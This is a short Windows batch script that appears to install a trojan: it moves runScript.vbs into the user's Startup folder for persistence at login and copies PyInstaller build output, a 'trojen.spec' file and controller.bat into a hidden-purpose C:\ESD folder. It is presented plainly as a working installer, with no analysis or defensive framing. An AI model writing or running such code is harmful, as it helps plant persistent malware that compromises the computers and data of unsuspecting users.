@echo off

set user_name=%USERNAME%

md C:/ESD

move runScript.vbs "C:\Users\%user_name%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy dist C:\ESD /E /H /C /R /Q /Y
xcopy build C:\ESD /E /H /C /R /Q /Y
xcopy __pycache__ C:\ESD /E /H /C /R /Q /Y
copy trojen.spec C:\ESD
copy controller.bat C:\ESD

pause